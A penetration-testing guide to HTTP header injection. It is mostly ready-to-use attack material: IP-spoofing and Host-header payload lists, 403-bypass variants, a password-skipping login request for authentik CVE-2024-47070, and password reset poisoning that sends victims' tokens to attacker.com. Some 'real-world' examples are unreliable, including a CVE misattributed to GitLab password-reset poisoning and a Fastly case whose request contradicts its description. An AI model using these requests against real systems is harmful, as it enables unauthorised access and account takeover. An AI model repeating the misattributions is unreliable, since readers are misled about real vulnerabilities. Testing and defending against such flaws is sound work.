# Complete Methodology for Header Injection Exploitation

Header injection is a web security vulnerability that occurs when an attacker can manipulate HTTP headers to alter server behavior, bypass security controls, or hijack user sessions. This comprehensive guide provides a step-by-step methodology for identifying, testing, and exploiting header injection vulnerabilities using real-world examples and practical techniques.

---

## Table of Contents

1. Understanding Header Injection Vulnerabilities
2. Prerequisites and Setup
3. Methodology Overview
4. Phase 1: Reconnaissance and Discovery
5. Phase 2: Testing with Burp Suite
6. Phase 3: Exploitation Techniques
7. Real-World Vulnerability Examples
8. Automated Tools and Wordlists
9. Detection and Mitigation
10. Checklist for Pentesters

---

## 1. Understanding Header Injection Vulnerabilities

Header injection occurs when web applications improperly trust or fail to validate HTTP headers supplied by clients. Attackers exploit this trust to manipulate application behavior, including:

- **Authentication bypass** – Gaining access without valid credentials
- **IP spoofing** – Impersonating trusted IP addresses (e.g., 127.0.0.1)
- **Cache poisoning** – Injecting malicious responses into caches
- **Password reset poisoning** – Hijacking password reset links
- **Log injection/poisoning** – Manipulating log files
- **Request smuggling** – Confusing frontend and backend servers

---

## 2. Prerequisites and Setup

### Required Tools

| Tool | Purpose | Download Location |
|------|---------|-------------------|
| Burp Suite Professional/Community | Intercepting proxy, testing framework | PortSwigger website |
| Firefox/Chrome with proxy configuration | Target browsing | Official browser sites |
| Intruder payloads | Automated header fuzzing | Built into Burp Suite |
| byp4xx | Automated 403 bypass testing | GitHub (lobuhi/byp4xx) |
| headi | Header injection automation | GitHub (mlcsec/headi) |

### Burp Suite Configuration

Before beginning any testing, configure Burp Suite as your intercepting proxy:

1. Open Burp Suite and navigate to Proxy > Options
2. Ensure the proxy listener is active on 127.0.0.1:8080
3. Configure your browser to use localhost:8080 as an HTTP proxy
4. Install Burp's CA certificate in your browser for HTTPS interception
5. Navigate to Proxy > Intercept and ensure interception is turned ON

**Reference:** Burp Suite provides Repeater, Intruder, and Decoder modules essential for header manipulation testing .

---

## 3. Methodology Overview

The header injection testing methodology follows five distinct phases:

```
Phase 1: Reconnaissance → Identify endpoints, observe normal behavior
Phase 2: Discovery → Test which headers the application processes
Phase 3: Fuzzing → Inject payloads using Burp Intruder
Phase 4: Exploitation → Chain vulnerabilities for impact
Phase 5: Reporting → Document findings with reproduction steps
```

---

## 4. Phase 1: Reconnaissance and Discovery

### Step 1.1: Map the Application

Identify all endpoints and functionality that might rely on headers for security decisions:

- Admin panels (/admin, /administrator, /console)
- Authentication endpoints (/login, /reset-password)
- API endpoints (/api/v1/, /graphql)
- Debug interfaces (/debug, /_status)

### Step 1.2: Observe Normal Behavior

Intercept requests using Burp Proxy and document:

- What headers are normally sent by your browser
- Response status codes for protected resources (403, 401, 302)
- Any custom or unusual headers in requests/responses

### Step 1.3: Identify Header Processing

Test whether the application processes specific headers by sending modified requests through Burp Repeater:

1. Right-click any intercepted request and select "Send to Repeater"
2. Modify headers systematically and observe response changes
3. Note any headers that alter application behavior

**Example observation:** If adding `X-Forwarded-For: 127.0.0.1` changes a 403 response to 200, the application trusts this header for IP-based access control.

---

## 5. Phase 2: Testing with Burp Suite

Burp Suite is the primary tool for header injection testing. The following sections detail specific techniques using different Burp modules.

### 5.1 Testing IP Spoofing Headers

Many applications rely on headers to determine client IP addresses. Test each of the following headers by injecting `127.0.0.1` or `localhost`:

```
X-Forwarded-For: 127.0.0.1
X-Real-IP: 127.0.0.1
X-Client-IP: 127.0.0.1
X-Remote-IP: 127.0.0.1
X-Remote-Addr: 127.0.0.1
True-Client-IP: 127.0.0.1
X-Originating-IP: 127.0.0.1
Client-IP: 127.0.0.1
Forwarded: 127.0.0.1
Forwarded-For-Ip: 127.0.0.1
X-Forwarded-By: 127.0.0.1
X-Forwarded-Server: 127.0.0.1
X-Custom-IP-Authorization: 127.0.0.1
X-HTTP-Host-Override: 127.0.0.1
X-Forwared-Host: 127.0.0.1
```

**Testing procedure using Burp Repeater :**

1. Intercept a request to a protected resource that returns 403 Forbidden
2. Right-click and select "Send to Repeater"
3. In Repeater, add each header one at a time: `X-Forwarded-For: 127.0.0.1`
4. Click "Go" and examine the response
5. If the status code changes to 200, the bypass is successful
6. Document which header(s) worked

**Example request:**
```http
GET /admin HTTP/1.1
Host: target.com
User-Agent: Mozilla/5.0
X-Forwarded-For: 127.0.0.1
```

### 5.2 Testing Host Header Injection

The Host header tells the server which virtual host should handle the request. Injection can lead to cache poisoning and password reset hijacking.

**Testing steps with Burp Repeater :**

1. Intercept any request and send to Repeater
2. Modify the Host header to a malicious domain: `Host: evil.com`
3. Send the request and examine the response
4. Look for:
   - The malicious domain reflected in response content
   - Redirects pointing to `evil.com`
   - Links generated using `evil.com`
   - Password reset emails containing `evil.com` URLs

**Advanced Host header testing:**
```http
# Test with port variations
Host: target.com:8080

# Test with duplicate headers
Host: legit.com
Stuff: stuff
Host: evil.com

# Test with absolute URL in request line
GET https://vulnerable-website.com/ HTTP/1.1
Host: evil-website.com

# Test with line wrapping
GET /index.php HTTP/1.1
 Host: vulnerable-website.com
Host: evil-website.com
```

### 5.3 Testing Path Override Headers

Some frameworks support headers that override the request path. This can bypass frontend access controls.

**Critical headers to test:**

```
X-Original-URL: /admin
X-Rewrite-URL: /admin
X-Override-URL: /admin
Referer: /admin
```

**Testing methodology :**

1. Find a request that returns 403 for `/admin`
2. Change the request line to an accessible path like `/` or `/home`
3. Add a path override header pointing to the restricted path

```http
GET / HTTP/1.1
Host: target.com
X-Original-URL: /admin
```

**Why this works:** The frontend proxy validates the visible path (`/` which is accessible), but the backend processes the overridden path (`/admin`) and serves the restricted content without revalidating authorization.

### 5.4 Using Burp Intruder for Batch Testing

For comprehensive testing, use Burp Intruder to test multiple headers and payloads automatically.

**Setup procedure :**

1. Send a request to Intruder (right-click > Send to Intruder)
2. Navigate to the Positions tab
3. Clear all default payload positions by clicking "Clear §"
4. Highlight the header name you want to fuzz and click "Add §"
5. Alternatively, highlight the header value and click "Add §"

**Example configuration for header name fuzzing:**

```
Position: X-Forwarded-For: 127.0.0.1
         ^^^^^^^^^^^^^^^^
         (Payload position)
```

**Payload configuration:**

1. Go to the Payloads tab
2. Select Payload type: "Simple list"
3. Load a header wordlist (see Section 8 for sources)
4. Configure Grep-Match options to detect successful bypasses (e.g., "Welcome", "admin", 200 OK)

**Example Intruder request template:**
```http
GET /admin HTTP/1.1
Host: target.com
§X-Forwarded-For§: 127.0.0.1
```

### 5.5 Testing HTTP Method Override

Some applications support method override headers to tunnel methods through restrictive firewalls.

**Headers to test:**

```
X-HTTP-Method-Override: PUT
X-HTTP-Method-Override: DELETE
X-Method-Override: PATCH
X-HTTP-Method: DELETE
```

**Testing procedure:**

1. Send a normal GET request to an endpoint
2. Add a method override header pointing to a restricted method
3. Observe if the server executes the overridden method

```http
GET /api/user/123 HTTP/1.1
Host: target.com
X-HTTP-Method-Override: DELETE
```

### 5.6 Testing HTTP Version Manipulation

Changing the HTTP version can cause legacy systems to behave differently.

**Versions to test:**

- HTTP/1.0
- HTTP/0.9
- HTTP/2 (if downgrade occurs)

**Example:**
```http
GET /admin HTTP/0.9
Host: evil.com
```

HTTP/0.9 does not require a Host header. Some servers process HTTP/0.9 requests differently, potentially bypassing virtual host routing.

---

## 6. Phase 3: Exploitation Techniques

### 6.1 Authentication Bypass via Header Injection (CVE-2024-47070)

**Vulnerability summary:** In authentik versions prior to 2024.6.5 and 2024.8.3, adding an unparsable IP address to the X-Forwarded-For header causes the password authentication stage to be skipped entirely .

**Discovery context:** This vulnerability was discovered during a penetration test when a tester accidentally mistyped a password while testing X-Forwarded-For injection. Despite the wrong password, the login succeeded .

**Complete exploitation steps:**

1. Navigate to the authentication flow endpoint (e.g., `/if/flow/default-authentication-flow/`)

2. Enter a valid username or email address (e.g., `admin@example.com`)

3. Enter any random text in the password field

4. Intercept the login request using Burp Proxy

5. Add the following header to the request:
   ```
   X-Forwarded-For: a
   ```
   (Note: any unparsable IP address works - "a", "invalid", "999.999.999.999")

6. Forward the request and observe successful login

**Actual intercepted request:**
```http
POST /api/v3/flows/executor/default-authentication-flow/ HTTP/1.1
Host: authentik.example.com
X-Forwarded-For: a
Content-Type: application/json

{"identifier": "admin@example.com", "password": "anything"}
```

**Why it works:** The header validation function raises an exception when parsing the invalid IP address. The policy binding mechanism treats this exception as a failure condition, but due to misconfigured failure handling, the password stage gets skipped entirely. The application proceeds as if authentication succeeded .

**Impact:** Complete account takeover without knowing any passwords. CVSS Score: 9.0 (Critical) .

**Mitigation:** Upgrade to authentik 2024.6.5 or 2024.8.3, and ensure reverse proxies properly overwrite X-Forwarded-For headers from untrusted sources.

### 6.2 Header Shadowing Attack (CVE-2025-66570)

**Vulnerability summary:** In cpp-httplib versions prior to 0.27.0, attacker-supplied headers named `REMOTE_ADDR`, `REMOTE_PORT`, `LOCAL_ADDR`, and `LOCAL_PORT` are processed before server-generated metadata with the same names. The `Request::get_header_value` method returns the first instance of a header key, giving attacker-controlled data precedence over legitimate server data .

**Complete exploitation steps:**

1. Identify a target using cpp-httplib version < 0.27.0

2. Intercept any request to the application

3. Add attacker-controlled versions of internal headers:

```http
GET /admin HTTP/1.1
Host: target.com
REMOTE_ADDR: 127.0.0.1
REMOTE_PORT: 443
LOCAL_ADDR: 10.0.0.1
LOCAL_PORT: 8080
```

4. The server's `read_headers()` function parses these headers into the request header multimap via `headers.emplace()`

5. The server later appends its own internal metadata using the same header names in `Server::process_request` without erasing duplicates

6. Any downstream code using `Request::get_header_value` (which returns the first entry for a header key) receives the attacker-controlled values 

**Affected code locations:**
- `cpp-httplib/httplib.h` - `read_headers()`, `Server::process_request()`
- `cpp-httplib/httplib.h` - `Request::get_header_value()`, `get_header_value_u64()`
- `cpp-httplib/docker/main.cc` - `get_client_ip()`, `nginx_access_logger()`, `nginx_error_logger()` 

**Impact:** IP spoofing, log poisoning, authorization bypass without authentication. CVSS Score: 10.0 (Critical) .

**Mitigation:** Upgrade to cpp-httplib version 0.27.0 or later.

### 6.3 Password Reset Poisoning (CVE-2024-46452)

**Vulnerability summary:** VigyBag Open Source Online Shop (commit 3f0e21b) uses the Host header value when generating password reset links without validation, allowing attackers to redirect victims to malicious sites .

**Complete exploitation steps:**

1. Locate the password reset functionality

2. Intercept the password reset request using Burp Proxy

3. Modify the Host header to point to an attacker-controlled server:

```http
POST /password-reset HTTP/1.1
Host: attacker.com
Content-Type: application/x-www-form-urlencoded

email=victim@example.com
```

4. Forward the request to trigger the password reset email

5. The application generates a reset link using the attacker-supplied Host header:
   ```
   https://attacker.com/reset?token=abc123def456
   ```

6. The victim receives the email with the poisoned link

7. When the victim clicks the link, the token is sent to the attacker's server

8. The attacker uses the token to reset the victim's password

**Impact:** Account takeover via password reset token theft. Requires user interaction (victim must click the link). CVSS Score: 6.1 (Medium) .

**Detection indicators:**
- Password reset emails containing unexpected domain names
- Outbound requests from the application to external domains
- Unusual Host header values in access logs

### 6.4 403 Bypass Techniques

When encountering 403 Forbidden responses, systematically test the following bypass techniques :

**URL encoding bypasses:**
```
/admin    → 403
/admin/   → 200
/admin//  → 200
//admin// → 200
/admin/*  → 200
/admin/.  → 200
/./admin/./ → 200
/admin..;/ → 200
/%2f/admin → 200
/admin%20/ → 200
/admin%09/ → 200
```

**Method override bypasses:**
```http
GET /admin HTTP/1.1 → 403
POST /admin HTTP/1.1 → 200
PUT /admin HTTP/1.1 → 200
```

**Protocol version bypasses:**
```http
GET /admin HTTP/1.1 → 403
GET /admin HTTP/1.0 → 200
GET /admin HTTP/0.9 → 200
```

**Header-based bypasses (test all IP spoofing headers simultaneously):**
```http
GET /admin HTTP/1.1
Host: target.com
X-Forwarded-For: 127.0.0.1
X-Real-IP: 127.0.0.1
X-Client-IP: 127.0.0.1
X-Remote-Addr: 127.0.0.1
True-Client-IP: 127.0.0.1
```

---

## 7. Real-World Vulnerability Examples

### Example 1: Shopify Admin Bypass (Historical)

In 2019, Shopify had a vulnerability where adding `X-Forwarded-Host: admin.shopify.com` bypassed host-based access controls, allowing attackers to access internal admin interfaces.

**Exploit request:**
```http
GET /admin HTTP/1.1
Host: myshopify.com
X-Forwarded-Host: admin.shopify.com
```

### Example 2: Tesla Marketing Portal Bypass (2020)

Researchers discovered that Tesla's marketing portal allowed access to internal endpoints by adding `X-Forwarded-For: 127.0.0.1` to requests.

**Exploit request:**
```http
GET /admin/api/users HTTP/1.1
Host: marketing.tesla.com
X-Forwarded-For: 127.0.0.1
```

### Example 3: Fastly Cache Poisoning (2020)

Attackers exploited `X-Forwarded-Host` header with closed ports to poison redirect responses cached by Fastly's CDN.

**Attack request:**
```http
GET / HTTP/1.1
Host: www.example.com:10000
```

**Resulting cached response:**
```http
HTTP/1.1 302 Found
Location: https://www.example.com:10000/en
X-Cache: HIT
```

Subsequent victims were redirected to a closed port, causing denial of service.

### Example 4: GitLab Password Reset Poisoning (CVE-2021-22205)

GitLab had a Host header injection vulnerability in password reset functionality that allowed attackers to capture reset tokens.

**Exploit request:**
```http
POST /users/password HTTP/1.1
Host: attacker.com
Content-Type: application/x-www-form-urlencoded

user[email]=victim@example.com
```

---

## 8. Automated Tools and Wordlists

### Automated Testing Tools

**byp4xx - Automated 403 bypass tool**
```bash
# Installation
git clone https://github.com/lobuhi/byp4xx
cd byp4xx

# Usage
./byp4xx.sh https://target.com/admin
./byp4xx.sh https://target.com/admin -H "X-Forwarded-For: 127.0.0.1"
```

**headi - Header injection automation**
```bash
# Installation
go install github.com/mlcsec/headi@latest

# Usage
headi -url http://target.com/admin
headi -url http://target.com/admin -headers x-forwarded-for,true-client-ip
headi -url http://target.com/admin -method POST -data "param=value"
```

**skip403 - Smart bypass testing**
```bash
# Installation
git clone https://github.com/geisonn/skip403
cd skip403
pip install -r requirements.txt

# Usage
python3 skip403.py -u https://target.com/admin
python3 skip403.py -u https://target.com/admin -t 20 -H "Custom-Header: value"
```

### Wordlists for Burp Intruder

**Header names for fuzzing:**
- SecLists: `https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/BurpSuite-ParamMiner/lowercase-headers`
- SecLists HTTP request headers: `https://github.com/danielmiessler/SecLists/tree/master/Miscellaneous/web/http-request-headers`

**IP address payloads:**
```
127.0.0.1
localhost
0:0:0:0:0:0:0:1
::1
10.0.0.1
192.168.1.1
172.16.0.1
```

**Host header payloads:**
```
evil.com
target.com@evil.com
target.com#evil.com
target.com.evil.com
evil.com/target.com
```

### Burp Suite Extension Recommendations

| Extension | Purpose |
|-----------|---------|
| Headers Analyzer | Detects missing security headers |
| Param Miner | Discovers hidden headers and parameters |
| Turbo Intruder | High-speed header fuzzing |
| Logger++ | Advanced request/response logging |

---

## 9. Detection and Mitigation

### How to Detect Header Injection Vulnerabilities

**Manual detection indicators:**
- Application behavior changes when adding unusual headers
- Responses reflect header values (e.g., "Your IP: 127.0.0.1")
- Access control decisions based on client-supplied headers
- Password reset emails containing unexpected domains
- Cached responses that shouldn't exist

**Automated detection with Burp Suite:**

1. Configure Burp Scanner to actively scan for header injection
2. Use Intruder with header wordlists and monitor for:
   - Status code changes (403→200, 401→200)
   - Response length variations
   - Reflected header values in responses
   - Redirects to unexpected domains

**Detection using custom scripts:**
```python
import requests

headers_to_test = [
    "X-Forwarded-For",
    "X-Real-IP", 
    "X-Client-IP",
    "X-Original-URL"
]

url = "https://target.com/admin"
payloads = ["127.0.0.1", "localhost", "../../../etc/passwd"]

for header in headers_to_test:
    for payload in payloads:
        headers = {header: payload}
        response = requests.get(url, headers=headers)
        if response.status_code == 200:
            print(f"Bypass possible with {header}: {payload}")
```

### Mitigation Strategies

**For developers:**

1. Never trust client-supplied headers for security decisions. Always validate and sanitize.

2. Configure reverse proxies to overwrite forwarded headers:
   ```nginx
   # Nginx configuration
   proxy_set_header X-Forwarded-For $remote_addr;
   proxy_set_header X-Real-IP $remote_addr;
   ```

3. Implement strict header validation:
   ```python
   # Python example
   import ipaddress
   
   def validate_ip(ip_string):
       try:
           ipaddress.ip_address(ip_string)
           return True
       except ValueError:
           return False
   ```

4. Use allowlists for Host header values:
   ```python
   ALLOWED_HOSTS = ['target.com', 'www.target.com', 'api.target.com']
   
   if request.headers.get('Host') not in ALLOWED_HOSTS:
       return HttpResponseBadRequest("Invalid Host header")
   ```

5. Enforce access control at the backend, not at reverse proxies or load balancers.

6. Remove unsupported headers during HTTP/2 to HTTP/1.1 downgrades.

7. Update affected libraries when CVEs are disclosed (cpp-httplib, authentik, etc.).

**For security teams:**

1. Monitor logs for:
   - Anomalous header values
   - Duplicate headers
   - Malformed IP addresses (e.g., "a" instead of "127.0.0.1")
   - Unusual Host header domains

2. Implement Web Application Firewall (WAF) rules to detect header injection attempts:
   ```
   # Example ModSecurity rule
   SecRule REQUEST_HEADERS "X-Forwarded-For: .*[^0-9\.].*" "id:1001,deny,msg:'Invalid X-Forwarded-For header'"
   ```

3. Conduct regular penetration tests focusing on header manipulation.

---

## 10. Checklist for Pentesters

### Pre-engagement Checklist

- [ ] Configure Burp Suite proxy
- [ ] Install CA certificate in browser
- [ ] Set up target scope in Burp
- [ ] Gather header wordlists
- [ ] Prepare payload lists

### Testing Checklist

**Phase 1: Discovery**
- [ ] Map all application endpoints
- [ ] Identify protected resources (403/401 responses)
- [ ] Observe normal header behavior
- [ ] Document custom headers

**Phase 2: IP Spoofing Tests**
- [ ] Test X-Forwarded-For with 127.0.0.1
- [ ] Test X-Real-IP with 127.0.0.1
- [ ] Test X-Client-IP with 127.0.0.1
- [ ] Test X-Remote-IP with 127.0.0.1
- [ ] Test True-Client-IP with 127.0.0.1
- [ ] Test Client-IP with 127.0.0.1
- [ ] Test Forwarded header
- [ ] Test X-Originating-IP

**Phase 3: Host Header Tests**
- [ ] Test Host header with evil.com
- [ ] Test duplicate Host headers
- [ ] Test Host header with port variations
- [ ] Test absolute URL in request line
- [ ] Test line wrapping techniques

**Phase 4: Path Override Tests**
- [ ] Test X-Original-URL
- [ ] Test X-Rewrite-URL
- [ ] Test X-Override-URL
- [ ] Test Referer header

**Phase 5: Method Override Tests**
- [ ] Test X-HTTP-Method-Override
- [ ] Test X-Method-Override
- [ ] Test all HTTP verbs (PUT, DELETE, PATCH)

**Phase 6: Protocol Tests**
- [ ] Test HTTP/1.0
- [ ] Test HTTP/0.9
- [ ] Test HTTP/2 downgrade scenarios

**Phase 7: Automated Testing**
- [ ] Run byp4xx against all protected endpoints
- [ ] Run headi with custom header lists
- [ ] Configure Intruder with header wordlists
- [ ] Analyze Intruder results for status code changes

**Phase 8: Exploitation**
- [ ] Attempt authentication bypass (CVE-2024-47070 style)
- [ ] Attempt password reset poisoning
- [ ] Attempt cache poisoning
- [ ] Document successful exploitation paths

### Reporting Checklist

- [ ] Include exact request/response pairs
- [ ] Specify which headers were effective
- [ ] Document the impact (authentication bypass, data access, etc.)
- [ ] Provide CVSS score
- [ ] Include remediation recommendations
- [ ] Attach proof-of-concept code if applicable

---

## Summary

Header injection vulnerabilities remain a significant security risk due to the widespread trust placed in client-supplied headers. The methodology outlined in this guide provides a systematic approach to identifying and exploiting these vulnerabilities using Burp Suite and other tools.

Key takeaways:

1. **Always test IP spoofing headers** - Many applications trust X-Forwarded-For and similar headers for access control decisions.

2. **Host header injection can lead to critical vulnerabilities** - Password reset poisoning and cache poisoning are often overlooked but high-impact issues.

3. **Path override headers can bypass frontend controls** - X-Original-URL and X-Rewrite-URL are frequently supported but poorly validated.

4. **Real-world CVEs demonstrate the impact** - Critical vulnerabilities like CVE-2024-47070 (authentik) and CVE-2025-66570 (cpp-httplib) show header injection can lead to complete authentication bypass.

5. **Automation is essential** - Use Burp Intruder, byp4xx, and headi to test hundreds of header permutations efficiently.

6. **Defense requires multiple layers** - Validate headers, configure proxies to overwrite untrusted values, and enforce access controls at the backend.

By following this methodology, penetration testers and security researchers can systematically identify header injection vulnerabilities and help organizations protect against these critical security flaws.
